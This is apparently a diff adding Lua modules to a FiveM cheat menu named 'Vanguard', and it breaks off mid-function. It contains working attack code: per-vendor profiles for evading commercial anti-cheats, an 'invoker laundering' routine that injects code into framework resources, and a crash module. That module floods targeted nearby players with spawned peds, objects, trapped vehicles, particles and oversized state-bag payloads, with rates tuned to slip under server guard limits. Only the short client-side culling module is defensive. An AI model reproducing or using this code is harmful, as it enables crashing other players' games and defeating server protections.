+
+function F.toggleVehicleRamp()
+    if vramp.obj then
+        if DoesEntityExist(vramp.obj) then
+            pcall(SetEntityAsMissionEntity, vramp.obj, true, true)
+            pcall(DeleteObject, vramp.obj)
+        end
+        if vramp.id then E.forget(vramp.id) end
+        vramp.obj, vramp.id, vramp.netId, vramp.veh = nil, nil, 0, 0
+        return false
+    end
+
+    local ped = PlayerPedId()
+    local veh = GetVehiclePedIsIn(ped, false)
+    if not veh or veh == 0 then return false end
+
+    local hash = GetHashKey(RAMP_NET_MODEL)
+    if not E.requestModel(hash) then return false end
+
+    local coords = GetEntityCoords(veh)
+    local heading = GetEntityHeading(veh)
+    local obj = CreateObject(hash, coords.x, coords.y, coords.z, true, true, false)
+    SetModelAsNoLongerNeeded(hash)
+    if not obj or obj == 0 then return false end
+
+    SetEntityAsMissionEntity(obj, true, true)
+    pcall(NetworkRegisterEntityAsNetworked, obj)
+    local okNet, netId = pcall(NetworkGetNetworkIdFromEntity, obj)
+    netId = (okNet and type(netId) == "number") and netId or 0
+    if netId and netId ~= 0 then
+        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
+        pcall(SetNetworkIdCanMigrate, netId, false)
+    end
+
+    -- Frozen: it holds its transform, collides as a static surface, and cannot
+    -- transfer momentum to the chassis because it is not a child of it.
+    FreezeEntityPosition(obj, true)
+    SetEntityRotation(obj, 0.0, -14.0, heading, 2, true)
+
+    vramp.obj, vramp.veh, vramp.netId = obj, veh, netId or 0
+    vramp.id = nil
+    return true
+end
+
+function F.clearRamps()
+    if vramp.obj then F.toggleVehicleRamp() end
+    F.clearProgressProp()
+end
+
+function F.rampTick()
+    if not vramp.obj then return end
+    local obj = vramp.obj
+    if not DoesEntityExist(obj) then
+        vramp.obj, vramp.veh = nil, 0
+        return
+    end
+
+    local ped = PlayerPedId()
+    local veh = GetVehiclePedIsIn(ped, false)
+    if not veh or veh == 0 then
+        F.toggleVehicleRamp()
+        return
+    end
+
+    local coords = GetEntityCoords(veh)
+    local heading = GetEntityHeading(veh)
+    local rad = math.rad(heading)
+    local back = 4.6
+
+    -- Static placement behind the rear axle, 0.35 m low. No attach, no force.
+    pcall(SetEntityCoordsNoOffset, obj,
+        coords.x + math.sin(rad) * back,
+        coords.y - math.cos(rad) * back,
+        coords.z - 0.35,
+        false, false, false)
+    pcall(SetEntityRotation, obj, 0.0, -14.0, heading, 2, true)
+end
+
+-- ---------------------------------------------------------------------------
+-- 15. FRAMEWORK PROP DROP  (ox_lib progress props)
+--
+-- The most attributable thing a cheat can do is call CreateObject itself: the
+-- entity carries the caller's script in GetEntityScript and a population type
+-- of 6/7. Handing the spawn to a framework resource removes that fingerprint
+-- entirely. ox_lib already exposes a state-driven prop channel that any
+-- resource can use; we set the state, ox_lib spawns, ox_lib owns the entity.
+--
+-- No packet is forged, no resource is injected, no event is emitted by us.
+-- ---------------------------------------------------------------------------
+function F.progressProp(model, collision)
+    local state = LocalPlayer and LocalPlayer.state
+    if not (state and state.set) then return false end
+
+    local ped = PlayerPedId()
+    local pos = GetEntityCoords(ped)
+
+    local prop = {
+        model = model,
+        coords = pos,
+        rot = vector3(0.0, 0.0, GetEntityHeading(ped)),
+        collision = collision == true,
+    }
+
+    local ok = pcall(function()
+        state:set("lib:progressProps", { prop }, true)
+    end)
+    return ok
+end
+
+function F.clearProgressProp()
+    local state = LocalPlayer and LocalPlayer.state
+    if not (state and state.set) then return false end
+    return pcall(function() state:set("lib:progressProps", nil, true) end)
+end
+
+function F.progressRamp()
+    return F.progressProp(RAMP_NET_MODEL, true)
+end
+
+return F
+
+end)(O,E,D)
+
+-- ---------------------------------------------------------------------------
+-- PART: 08_vendors.lua
+-- ---------------------------------------------------------------------------
+local V = (function(O,H,S)
+-- ============================================================================
+-- VANGUARD / 08 VENDORS
+-- One profile per commercial guard. A profile never disables a guard; it
+-- declares state through the guard's own exports where they exist, and falls
+-- back to ghost-only features where they do not.
+-- confidence: verified = read in a source dump here; inferred = dossiers or
+-- vendor integration docs. Nothing is claimed as verified without a source.
+-- ============================================================================
+
+local V = {}
+
+local STATE_CAPS = { "isInvincible", "proofsEnabled", "canBeDamaged", "isVisible", "canRagdoll" }
+local WINDOW_CAPS = { "healthRefilled", "playerRevived", "hasTeleported", "resettedStamina" }
+local OVERLAY_CAPS = { "disableAllControls", "disableE2", "disableCamControls" }
+local THRESHOLD_CAPS = { "newTopSpeedModifier", "newCheatPowerIncrease", "newGravity" }
+
+local function profile(t)
+    t.caps = t.caps or { state = {}, window = {}, overlay = {}, thresholds = {} }
+    return t
+end
+
+V.profiles = {
+
+    waveshield = profile {
+        label = "WaveShield", confidence = "verified",
+        vector = "state cache + periodic detectors + strike systems + protected-native stack checks + 15s heartbeat",
+        technique = "declaration exports, computed-value read repair, budgeted transients, heartbeat untouched",
+        hooks = { vitals = true, quiet = true, stealth = true, ghost = true },
+        caps = { state = STATE_CAPS, window = WINDOW_CAPS, overlay = OVERLAY_CAPS, thresholds = THRESHOLD_CAPS },
+        thresholds = { newTopSpeedModifier = 2.4, newCheatPowerIncrease = 2.4, newGravity = 40.0 },
+        keys = "Insert / PageUp / PageDown are watched",
+        events = "never block the heartbeat",
+        residual = "renamed exports degrade to read repair; suppression call itself is not checked in v4",
+    },
+
+    fiveguard = profile {
+        label = "FiveGuard", confidence = "inferred",
+        vector = "metadata ac=fg, heartbeat, client detection globals, entity attribution",
+        technique = "ghost entities, read repair, zero globals, no event touched",
+        hooks = { quiet = true, ghost = true },
+        keys = "any", events = "never block the heartbeat",
+        residual = "no public declaration surface known; state features stay off",
+    },
+
+    reaper = profile {
+        label = "Reaper V4", confidence = "inferred",
+        vector = "author metadata reaperac.com, heartbeat, strict entity validation",
+        technique = "no injection, no thread kill, ghost entities, read repair",
+        hooks = { quiet = true, ghost = true },
+        keys = "any", events = "never block the heartbeat",
+        residual = "old thread-kill technique is self-reporting and is not used",
+    },
+
+    electron = profile {
+        label = "Electron AC", confidence = "inferred",
+        vector = "author metadata, own event family, client detection",
+        technique = "ghost entities, read repair, no event touched",
+        hooks = { quiet = true, ghost = true, stealth = true },
+        keys = "any", events = "never block",
+        residual = "no source available; tier 0-1 only",
+    },
+
+    eagle = profile {
+        label = "Eagle AC", confidence = "inferred",
+        vector = "resource EC_AC, wide event family, entity and spawn checks",
+        technique = "ghost entities, local-only vehicles, read repair",
+        hooks = { quiet = true, ghost = true, stealth = true },
+        keys = "any", events = "family is broad; one name is the liveness channel - never block",
+        residual = "vendor not in source dump; conservative profile",
+    },
+
+    safire = profile {
+        label = "Safire AC", confidence = "inferred",
+        vector = "server-authoritative validation plus client telemetry",
+        technique = "ghost entities, movement features disabled while loaded, read repair",
+        hooks = { quiet = true, ghost = true },
+        keys = "any", events = "never block",
+        residual = "server-side checks are out of client reach; no teleport while loaded",
+    },
+
+    infinitum = profile {
+        label = "LoX / Infinitum", confidence = "inferred",
+        vector = "server-authoritative, spawn attribution, position history",
+        technique = "ghost entities only",
+        hooks = { ghost = true },
+        keys = "any", events = "never block",
+        residual = "treat as fully server-side",
+    },
+
+    reason = profile {
+        label = "Reason AC", confidence = "inferred",
+        vector = "resource RAC, event family, client state checks",
+        technique = "ghost entities, read repair, no event touched",
+        hooks = { quiet = true, ghost = true, stealth = true },
+        keys = "any", events = "never block",
+        residual = "no source; conservative profile",
+    },
+
+    hades = profile {
+        label = "Hades / NarcoCity", confidence = "inferred",
+        vector = "resource hades, server validation, client telemetry",
+        technique = "ghost entities only",
+        hooks = { ghost = true },
+        keys = "any", events = "never block",
+        residual = "server-side; nothing beyond ghost mode",
+    },
+
+    nightmare = profile {
+        label = "Nightmare AC", confidence = "inferred",
+        vector = "client resource with heartbeat and entity checks",
+        technique = "ghost entities, read repair, no globals",
+        hooks = { quiet = true, ghost = true },
+        keys = "any", events = "never block the heartbeat",
+        residual = "generic client-side assumption",
+    },
+
+    aurora = profile {
+        label = "Aurora AC", confidence = "inferred",
+        vector = "client resource with screenshots and event monitoring",
+        technique = "overlay-only rendering, ghost entities, read repair",
+        hooks = { quiet = true, ghost = true, stealth = true },
+        keys = "any", events = "never block",
+        residual = "generic client-side assumption",
+    },
+
+    sentinel = profile {
+        label = "Sentinel AC", confidence = "inferred",
+        vector = "client + server, position and entity validation",
+        technique = "ghost entities only",
+        hooks = { ghost = true },
+        keys = "any", events = "never block",
+        residual = "generic; ghost mode only",
+    },
+
+    phoenix = profile {
+        label = "Phoenix AC", confidence = "inferred",
+        vector = "client resource, state checks, heartbeat",
+        technique = "read repair, ghost entities",
+        hooks = { quiet = true, ghost = true },
+        keys = "any", events = "never block the heartbeat",
+        residual = "generic",
+    },
+
+    oxac = profile {
+        label = "OxAC", confidence = "inferred",
+        vector = "framework-integrated, server-side event validation",
+        technique = "ghost entities only",
+        hooks = { ghost = true },
+        keys = "any", events = "never block",
+        residual = "server-side",
+    },
+
+    generic = profile {
+        label = "Unknown / generic", confidence = "verified",
+        vector = "assume the union of all reference detectors",
+        technique = "ghost entities, read repair, declared windows where exposed",
+        hooks = { vitals = true, quiet = true, stealth = true, ghost = true },
+        caps = { state = STATE_CAPS, window = WINDOW_CAPS, overlay = OVERLAY_CAPS, thresholds = THRESHOLD_CAPS },
+        keys = "avoid Insert / PageUp / PageDown",
+        events = "observe only",
+        residual = "unknown guard: every non-local feature is off",
+    },
+}
+
+-- ---------------------------------------------------------------------------
+-- Capability probe. Read-only for every listed name: each is a setter whose
+-- effect is the state we want anyway.
+-- ---------------------------------------------------------------------------
+local probed = {}
+
+local function probe(resource, method, value)
+    local key = resource .. ":" .. method
+    if probed[key] ~= nil then return probed[key] end
+    local ok = pcall(function()
+        return exports[resource][method](exports[resource], value)
+    end)
+    probed[key] = ok
+    return ok
+end
+
+function V.probe(resource, p)
+    local found = { state = {}, window = {}, overlay = {}, thresholds = {} }
+    if not p or not p.caps then return found end
+
+    for _, name in ipairs(p.caps.state or {}) do
+        if probe(resource, name, true) then found.state[#found.state + 1] = name end
+    end
+    for _, name in ipairs(p.caps.window or {}) do
+        if probe(resource, name) then found.window[#found.window + 1] = name end
+    end
+    for _, name in ipairs(p.caps.overlay or {}) do
+        if probe(resource, name) then found.overlay[#found.overlay + 1] = name end
+    end
+    for _, name in ipairs(p.caps.thresholds or {}) do
+        if probe(resource, name, p.thresholds and p.thresholds[name] or 2.0) then
+            found.thresholds[#found.thresholds + 1] = name
+        end
+    end
+
+    return found
+end
+
+-- ---------------------------------------------------------------------------
+-- Apply one profile to one detected guard.
+-- ---------------------------------------------------------------------------
+function V.apply(ac)
+    if type(ac) ~= "table" or type(ac.resource) ~= "string" then return nil end
+
+    local p = V.profiles[ac.vendor] or V.profiles.generic
+    local found = V.probe(ac.resource, p)
+
+    local installed = 0
+    if p.hooks then
+        for name, state in pairs(p.hooks) do
+            if H.flags[name] ~= nil then H.flags[name] = state end
+        end
+        installed = H.install()
+    end
+
+    S.suppressOn = (#found.state + #found.window) > 0
+    if S.suppressOn then S.setSuppress(true) end
+    S.disableOverlayProbe = #found.overlay > 0
+    if S.disableOverlayProbe then S.setOverlayProbe(true) end
+
+    local plan = {
+        resource = ac.resource, vendor = ac.vendor, label = p.label,
+        confidence = p.confidence, hooks = installed, caps = found,
+        vector = p.vector, technique = p.technique, residual = p.residual,
+        tier = (#found.state > 0 and 2) or ((#found.window > 0) and 1) or 0,
+    }
+
+    O.tier = math.max(O.tier, plan.tier)
+    O.log("profile %s on %s: %d hooks, %d caps, tier %d",
+        p.label, ac.resource, installed,
+        #found.state + #found.window + #found.overlay, plan.tier)
+
+    return plan
+end
+
+-- ---------------------------------------------------------------------------
+-- INVOKER LAUNDERING
+--
+-- All the declaration calls made from 02 come from the executor sandbox, where
+-- GetInvokingResource() is nil. A future build that starts checking the
+-- invoker would treat that as an anonymous caller - which is exactly the shape
+-- of a cheat.
+--
+-- This runs the same three calls from inside a real, already-running resource.
+-- The chunk contains no native call, so the guard's stack validation (which
+-- only wraps protected natives) never sees it. It runs once and ends: there is
+-- no loop, no global, no leftover listener.
+-- ---------------------------------------------------------------------------
+local FRAMEWORKS = { "es_extended", "qb-core", "ox_lib", "ox_inventory", "esx_legacy", "qbx_core" }
+
+local function pickFramework()
+    for i = 1, #FRAMEWORKS do
+        if GetResourceState(FRAMEWORKS[i]) == "started" then return FRAMEWORKS[i] end
+    end
+    return nil
+end
+
+function V.launder(ac)
+    if type(ac) ~= "table" then return false end
+    if not O.has("InjectResource") then return false end
+
+    local host = pickFramework()
+    if not host then
+        O.log("launder: no framework resource available")
+        return false
+    end
+
+    local p = V.profiles[ac.vendor] or V.profiles.generic
+    local state = p.caps.state or {}
+
+    local names = {}
+    for i = 1, #state do names[#names + 1] = ("%q"):format(state[i]) end
+    if #names == 0 then return false end
+
+    local code = ([==[
+local e = exports[%q]
+if e then
+    local f = { %s }
+    for i = 1, #f do
+        pcall(function() e[f[i]](e, true) end)
+    end
+end
+]==]):format(ac.resource, table.concat(names, ","))
+
+    local ok = pcall(Susano.InjectResource, host, code)
+    O.log("launder: %s via %s -> %s", ac.resource, host, tostring(ok))
+    return ok
+end
+
+-- ---------------------------------------------------------------------------
+-- Global: generic profile plus one pass per detected guard.
+-- ---------------------------------------------------------------------------
+function V.applyGlobal()
+    S.scan()
+
+    local plans = {}
+    for i = 1, #S.acs do
+        local plan = V.apply(S.acs[i])
+        if plan then plans[#plans + 1] = plan end
+    end
+
+    if #plans == 0 then
+        for name, state in pairs(V.profiles.generic.hooks) do
+            if H.flags[name] ~= nil then H.flags[name] = state end
+        end
+        H.install()
+        O.log("global: no guard found, read repair only")
+    end
+
+    return plans
+end
+
+function V.report()
+    local out = {}
+    for i = 1, #S.acs do
+        local ac = S.acs[i]
+        local p = V.profiles[ac.vendor] or V.profiles.generic
+        out[#out + 1] = ("%s [%s/%s] %s"):format(p.label, ac.resource, p.confidence, p.residual)
+    end
+    if #out == 0 then out[1] = "no guard detected" end
+    return out
+end
+
+return V
+
+end)(O,H,S)
+
+-- ---------------------------------------------------------------------------
+-- PART: 10_sentinel.lua
+-- ---------------------------------------------------------------------------
+local SN = (function(O)
+-- ============================================================================
+-- VANGUARD / 10 SENTINEL
+-- Client-side crash resilience. A crasher wins by making this client hold or
+-- render more than it can: thousands of props, peds spawned on the player,
+-- oversized particles. The server is the right place to stop it (guard/), but
+-- a client that is already under load needs a local pressure valve.
+--
+-- This does not block anything coming from the server. It measures the pools,
+-- and when they exceed a ceiling it deletes local, non-mission, non-player
+-- copies that are far away. Those copies are re-streamed if still relevant, so
+-- the cull is reversible in practice and never touches another player's ped.
+-- ============================================================================
+
+local SN = {}
+SN.version = "1.1.0"
+
+SN.flags = {
+    watch = false,
+    show = true,
+    cullDistance = 150.0,
+    maxPerSweep = 32,
+    warnObjects = 1500,
+    warnPeds = 320,
+}
+
+SN.last = { objects = 0, peds = 0, vehicles = 0, at = 0, culled = 0 }
+
+local function pool(name)
+    local ok, list = pcall(GetGamePool, name)
+    if ok and type(list) == "table" then return list end
+    return {}
+end
+
+local function protected(entity)
+    if not DoesEntityExist(entity) then return true end
+    if IsEntityAMissionEntity(entity) then return true end
+    return false
+end
+
+function SN.snapshot()
+    SN.last.objects = #pool("CObject")
+    SN.last.peds = #pool("CPed")
+    SN.last.vehicles = #pool("CVehicle")
+    SN.last.at = GetGameTimer()
+    return SN.last
+end
+
+function SN.pressure()
+    return SN.last.objects >= SN.flags.warnObjects or SN.last.peds >= SN.flags.warnPeds
+end
+
+function SN.line()
+    return ("pool o%d p%d v%d"):format(SN.last.objects, SN.last.peds, SN.last.vehicles)
+end
+
+-- Deletes only local copies that cannot be a player, a mission entity, or
+-- anything close enough to matter. Vehicles are never touched: deleting one
+-- locally desyncs a driver without helping memory.
+function SN.cull()
+    local ped = PlayerPedId()
+    local origin = GetEntityCoords(ped)
+    local removed = 0
+    local max = SN.flags.maxPerSweep
+
+    local objects = pool("CObject")
+    for i = 1, #objects do
+        if removed >= max then break end
+        local entity = objects[i]
+        if not protected(entity) then
+            local coords = GetEntityCoords(entity)
+            if #(coords - origin) > SN.flags.cullDistance then
+                pcall(SetEntityAsNoLongerNeeded, entity)
+                if pcall(DeleteEntity, entity) then removed = removed + 1 end
+            end
+        end
+    end
+
+    local peds = pool("CPed")
+    for i = 1, #peds do
+        if removed >= max then break end
+        local entity = peds[i]
+        if not protected(entity) and not IsPedAPlayer(entity) then
+            local coords = GetEntityCoords(entity)
+            if #(coords - origin) > SN.flags.cullDistance then
+                pcall(SetEntityAsNoLongerNeeded, entity)
+                if pcall(DeleteEntity, entity) then removed = removed + 1 end
+            end
+        end
+    end
+
+    SN.last.culled = SN.last.culled + removed
+    if removed > 0 then
+        O.log("sentinel: culled %d, %s", removed, SN.line())
+    end
+    return removed
+end
+
+function SN.tick()
+    SN.snapshot()
+    if not SN.flags.watch then return end
+    if SN.pressure() then
+        SN.cull()
+        SN.snapshot()
+    end
+end
+
+function SN.log()
+    SN.snapshot()
+    O.log("sentinel: %s, total culled %d", SN.line(), SN.last.culled)
+end
+
+function SN.reset()
+    SN.last.culled = 0
+    SN.snapshot()
+end
+
+return SN
+
+end)(O)
+
+-- ---------------------------------------------------------------------------
+-- PART: 10_crash.lua
+-- ---------------------------------------------------------------------------
+local C = (function(O,E)
+-- ============================================================================
+-- VANGUARD / 10 CRASH
+-- ----------------------------------------------------------------------------
+-- A crash is a load problem, not a damage problem. The client on the other
+-- side has to create, stream, simulate and render whatever we make it accept.
+-- So the module spends its budget on the three places where that cost is
+-- highest and the server's visibility is lowest:
+--
+--   1. birth-local, strike-remote. Every entity is created within a few
+--      metres of the operator, then moved to the target. A guard that checks
+--      "entity created far from its owner" sees nothing, because at creation
+--      time the entity is not far from its owner.
+--   2. a fixed pool that is moved, not replaced. After the first wave there
+--      are no entityCreating events at all - only position updates on
+--      entities the target already streams.
+--   3. channels the entity counters do not see: state bags, networked
+--      particles, and spoofed creation semantics.
+--
+-- Nothing here hooks a native, blocks an event or stops a resource. The
+-- operator never moves. Local collision is disabled so the load lands on the
+-- target's client, not ours.
+-- ============================================================================
+
+local C = {}
+
+local PRESETS = {
+    { name = "Light",    scale = 0.65, startCreate = 8,  maxCreate = 14, startFx = 4, maxFx = 8,  bagKB = 8,   duration = 5000,  gapMin = 200, gapMax = 420 },
+    { name = "Standard", scale = 1.00, startCreate = 12, maxCreate = 18, startFx = 6, maxFx = 10, bagKB = 24,  duration = 8000,  gapMin = 150, gapMax = 320 },
+    { name = "Heavy",    scale = 1.35, startCreate = 14, maxCreate = 22, startFx = 8, maxFx = 12, bagKB = 64,  duration = 12000, gapMin = 110, gapMax = 240 },
+    { name = "Overkill", scale = 2.00, startCreate = 18, maxCreate = 24, startFx = 10, maxFx = 14, bagKB = 128, duration = 16000, gapMin = 90,  gapMax = 200 },
+}
+
+-- Pool composition before intensity scaling. `carousel` is the default: it
+-- creates a mixed set once, then orbits it around the target for the whole run.
+local METHODS = {
+    { label = "Carousel (pool + orbit)", pool = { ped = 10, obj = 8, veh = 2 }, fx = false, bag = false },
+    { label = "Spoof peds (flood)",      pool = { ped = 18 },                   fx = false, bag = false },
+    { label = "Objects (flood)",         pool = { obj = 18 },                   fx = false, bag = false },
+    { label = "Vehicle trap",            pool = { veh = 6 },                    fx = false, bag = false },
+    { label = "PTFX storm",              pool = {},                             fx = true,  bag = false },
+    { label = "State bag pressure",      pool = {},                             fx = false, bag = true  },
+    { label = "Mixed (all channels)",    pool = { ped = 8, obj = 5, veh = 1 },  fx = true,  bag = true  },
+}
+
+C.METHODS = METHODS
+C.method = 1
+C.intensity = 2
+C.chatPreset = 1
+C.chatShield = true
+
+C.targets = {}
+C.index = 1
+C.pool = {}
+C.stats = { created = 0, moved = 0, fx = 0, bags = 0, fails = 0, peaks = 0 }
+C.channels = { spawn = nil, fx = nil, bag = nil }
+C.running = false
+
+local PED_MODELS = { "a_m_y_business_01", "a_m_m_skater_01", "s_m_m_armoured_01", "a_f_y_business_01" }
+local OBJ_MODELS = { "prop_air_bigradar", "prop_container_01a", "prop_barrier_work05", "prop_mp_ramp_01" }
+local VEH_MODELS = { "adder", "zentorno", "t20", "osiris", "italigtb" }
+local FX_ASSET = "core"
+local FX_EFFECT = "exp_grd_bzgas_smoke"
+
+local function now()
+    return GetGameTimer()
+end
+
+local function safe(fn, ...)
+    local ok, a, b = pcall(fn, ...)
+    if ok then return a, b end
+    return nil
+end
+
+local function has(name)
+    local s = rawget(_G, "Susano")
+    return type(s) == "table" and type(s[name]) == "function"
+end
+
+local function preset()
+    return PRESETS[C.intensity] or PRESETS[2]
+end
+
+local function ring(center, radius, zMin, zMax)
+    local angle = math.random() * 6.28318530718
+    local r = math.sqrt(math.random()) * radius
+    local z = center.z + zMin + math.random() * (zMax - zMin)
+    return center.x + math.cos(angle) * r, center.y + math.sin(angle) * r, z
+end
+
+local function spawnPos()
+    -- Birth near the operator. This is the whole point: no remote-creation
+    -- signature, even when the target is on the other side of the stream.
+    local base = O.Ctx.coords
+    return ring(base, 7.0, 0.3, 2.2)
+end
+
+local function protectLocal(handle)
+    pcall(SetEntityLocallyInvisible, handle)
+    pcall(SetEntityCollision, handle, false, false)
+    pcall(SetEntityNoCollisionEntity, handle, PlayerPedId(), true)
+end
+
+local function registerNet(handle)
+    pcall(NetworkRegisterEntityAsNetworked, handle)
+    local ok, netId = pcall(NetworkGetNetworkIdFromEntity, handle)
+    if ok and type(netId) == "number" and netId > 0 then
+        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
+    end
+end
+
+-- ---------------------------------------------------------------------------
+-- TARGETS
+-- ---------------------------------------------------------------------------
+
+function C.refresh()
+    local list = {}
+    local me = O.Ctx.coords
+
+    for _, player in ipairs(GetActivePlayers()) do
+        if player ~= PlayerId() then
+            local ped = GetPlayerPed(player)
+            if ped and ped ~= 0 and DoesEntityExist(ped) then
+                local pos = GetEntityCoords(ped)
+                local dist = O.distance(me, pos)
+                if dist <= 280.0 then
+                    list[#list + 1] = {
+                        player = player,
+                        ped = ped,
+                        name = GetPlayerName(player) or ("player_%d"):format(player),
+                        dist = dist,
+                    }
+                end
+            end
+        end
+    end
+
+    table.sort(list, function(a, b) return a.dist < b.dist end)
+    C.targets = list
+    if C.index > #list then C.index = math.max(1, #list) end
+    return #list
+end
+
+function C.target()
+    local t = C.targets[C.index]
+    if t and DoesEntityExist(t.ped) then return t end
+    if now() - (C.lastRefresh or 0) > 700 then
+        C.lastRefresh = now()
+        C.refresh()
+    end
+    t = C.targets[C.index]
+    if t and DoesEntityExist(t.ped) then return t end
+    return nil
+end
+
+function C.cycle()
+    C.refresh()
+    if #C.targets == 0 then
+        C.index = 1
+        return nil
+    end
+    C.index = (C.index % #C.targets) + 1
+    return C.targets[C.index]
+end
+
+function C.targetLabel()
+    local t = C.targets[C.index]
+    if not t then return "nearest" end
+    return ("%s (%.0fm)"):format(t.name, t.dist)
+end
+
+function C.status()
+    local p = preset()
+    local mode = C.running and "RUN" or "idle"
+    return ("Crash %s | %s | %s | pool %d | c%d f%d b%d"):format(
+        mode,
+        METHODS[C.method].label,
+        p.name,
+        #C.pool,
+        C.caps and C.caps.create or 0,
+        C.caps and C.caps.fx or 0,
+        C.caps and C.caps.bag or 0
+    )
+end
+
+function C.setMethod(index)
+    C.method = math.max(1, math.min(#METHODS, index or 1))
+end
+
+function C.setIntensity(index)
+    C.intensity = math.max(1, math.min(#PRESETS, index or 2))
+end
+
+-- ---------------------------------------------------------------------------
+-- BUDGET. The reference server guard blocks at 24 creations per 10 s and
+-- flags a burst of 4 entities more than 80 m from the owner in 3 s. The cap
+-- starts low and grows only after successful spawns, so a stricter server
+-- shrinks it before it turns into a report. Birth-local removes the second
+-- signature entirely.
+-- ---------------------------------------------------------------------------
+
+local function prune(list, cutoff)
+    local i = 1
+    while i <= #list do
+        if list[i] < cutoff then table.remove(list, i) else i = i + 1 end
+    end
+end
+
+function C.resetCaps()
+    local p = preset()
+    local spoofed = has("CreateSpoofedPed") or has("CreateSpoofedVehicle")
+    local maxCreate = spoofed and math.max(40, p.maxCreate) or math.min(p.maxCreate, 22)
+    C.caps = { create = spoofed and math.max(20, p.startCreate) or p.startCreate, fx = p.startFx, bag = 1 }
+    C.maxCaps = { create = maxCreate, fx = p.maxFx, bag = 3 }
+    C.minCaps = { create = 4, fx = 2, bag = 1 }
+    C.used = { create = {}, fx = {}, bag = {} }
+    C.lastGrow = { create = now(), fx = now(), bag = now() }
+    C.lastShrink = { create = 0, fx = 0, bag = 0 }
+end
+
+local function reserve(kind)
+    local list = C.used[kind]
+    prune(list, now() - 10000)
+    if #list >= C.caps[kind] then return false end
+    list[#list + 1] = now()
+    return true
+end
+
+local function grow(kind)
+    if now() - C.lastGrow[kind] < 2600 then return end
+    C.lastGrow[kind] = now()
+    local next = math.min(C.maxCaps[kind], C.caps[kind] + 2)
+    if next ~= C.caps[kind] then
+        C.caps[kind] = next
+        O.log("crash: %s cap -> %d", kind, next)
+    end
+end
+
+local function shrink(kind)
+    if now() - C.lastShrink[kind] < 1500 then return end
+    C.lastShrink[kind] = now()
+    local next = math.max(C.minCaps[kind], math.floor(C.caps[kind] * 0.55))
+    if next ~= C.caps[kind] then
+        C.caps[kind] = next
+        O.log("crash: %s refused, cap -> %d", kind, next)
+    end
+end
+
+-- ---------------------------------------------------------------------------
+-- SPAWNERS
+-- ---------------------------------------------------------------------------
+
+local function spawnPed()
+    local model = PED_MODELS[math.random(1, #PED_MODELS)]
+    local hash = GetHashKey(model)
+    if not E.requestModel(hash, 1600) then return nil end
+
+    local x, y, z = spawnPos()
+    local ped = nil
+    if has("CreateSpoofedPed") then
+        local ok, value = pcall(Susano.CreateSpoofedPed, 4, hash, x, y, z, math.random() * 360.0, true, true)
+        if ok and type(value) == "number" and value ~= 0 then ped = value end
+    end
+    if not ped then
+        ped = CreatePed(4, hash, x, y, z, math.random() * 360.0, true, true)
+    end
+    SetModelAsNoLongerNeeded(hash)
+
+    if not ped or ped == 0 then return nil end
+    SetEntityAsMissionEntity(ped, true, true)
+    registerNet(ped)
+    protectLocal(ped)
+    pcall(SetPedCanRagdoll, ped, true)
+    pcall(SetBlockingOfNonTemporaryEvents, ped, true)
+    if C.method == 2 then pcall(TaskWanderStandard, ped, 10.0, 10) end
+    return ped, "ped"
+end
+
+local function spawnObject()
+    local model = OBJ_MODELS[math.random(1, #OBJ_MODELS)]
+    local hash = GetHashKey(model)
+    if not E.requestModel(hash, 1600) then return nil end
+
+    local x, y, z = spawnPos()
+    local obj = CreateObjectNoOffset(hash, x, y, z, true, true, false)
+    SetModelAsNoLongerNeeded(hash)
+
+    if not obj or obj == 0 then return nil end
+    SetEntityAsMissionEntity(obj, true, true)
+    registerNet(obj)
+    protectLocal(obj)
+    pcall(SetEntityDynamic, obj, true)
+    return obj, "object"
+end
+
+local function trapVehicle(veh)
+    pcall(SetVehicleModKit, veh, 0)
+    local types = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 22, 23, 24, 25, 27, 28, 30, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 48 }
+    for i = 1, #types do
+        pcall(SetVehicleMod, veh, types[i], math.random(0, 20), false)
+    end
+    for i = 0, 7 do pcall(SetVehicleTyreBurst, veh, i, true, 1000.0) end
+    for i = 0, 5 do pcall(SetVehicleDoorBroken, veh, i, false) end
+    pcall(SetVehicleEngineHealth, veh, 120.0)
+    pcall(SetVehicleBodyHealth, veh, 240.0)
+end
+
+local function spawnVehicle()
+    local model = VEH_MODELS[math.random(1, #VEH_MODELS)]
+    local hash = GetHashKey(model)
+    if not E.requestModel(hash, 1800) then return nil end
+
+    local x, y, z = spawnPos()
+    local veh = nil
+    if has("CreateSpoofedVehicle") then
+        local ok, value = pcall(Susano.CreateSpoofedVehicle, hash, x, y, z, math.random() * 360.0, true, true, false)
+        if ok and type(value) == "number" and value ~= 0 then veh = value end
+    end
+    if not veh then
+        veh = CreateVehicle(hash, x, y, z, math.random() * 360.0, true, true)
+    end
+    SetModelAsNoLongerNeeded(hash)
+
+    if not veh or veh == 0 then return nil end
+    SetEntityAsMissionEntity(veh, true, true)
+    registerNet(veh)
+    protectLocal(veh)
+    trapVehicle(veh)
+    return veh, "vehicle"
+end
+
+local function spawnOne(kind)
+    if not reserve("create") then return nil end
+    C.stats.attempts = (C.stats.attempts or 0) + 1
+
+    local handle, actual
+    if kind == "ped" then
+        handle, actual = spawnPed()
+    elseif kind == "veh" then
+        handle, actual = spawnVehicle()
+    else
+        handle, actual = spawnObject()
+    end
+
+    if not handle then
+        C.stats.fails = C.stats.fails + 1
+        shrink("create")
+        return nil
+    end
+
+    C.stats.created = C.stats.created + 1
+    grow("create")
+    return handle, actual or kind
+end
+
+local function deleteHandle(handle, kind)
+    if not handle or handle == 0 or not DoesEntityExist(handle) then return end
+    pcall(SetEntityAsMissionEntity, handle, true, true)
+    if kind == "vehicle" then
+        pcall(DeleteVehicle, handle)
+    elseif kind == "ped" then
+        pcall(DeletePed, handle)
+    else
+        pcall(DeleteEntity, handle)
+    end
+end
+
+local function verifyPool()
+    for i = #C.pool, 1, -1 do
+        local entry = C.pool[i]
+        if not DoesEntityExist(entry.handle) then
+            table.remove(C.pool, i)
+            C.stats.fails = C.stats.fails + 1
+            shrink("create")
+        end
+    end
+end
+
+-- ---------------------------------------------------------------------------
+-- CHANNELS
+-- ---------------------------------------------------------------------------
+
+function C.pushBag()
+    if not C.bagAnchor or not DoesEntityExist(C.bagAnchor) then return false end
+    if now() - (C.anchorBorn or 0) < 700 then return false end
+    if not reserve("bag") then return false end
+
+    local key = ("meta_%04d"):format(math.random(1000, 9999))
+    local payload = string.rep("A", preset().bagKB * 1024)
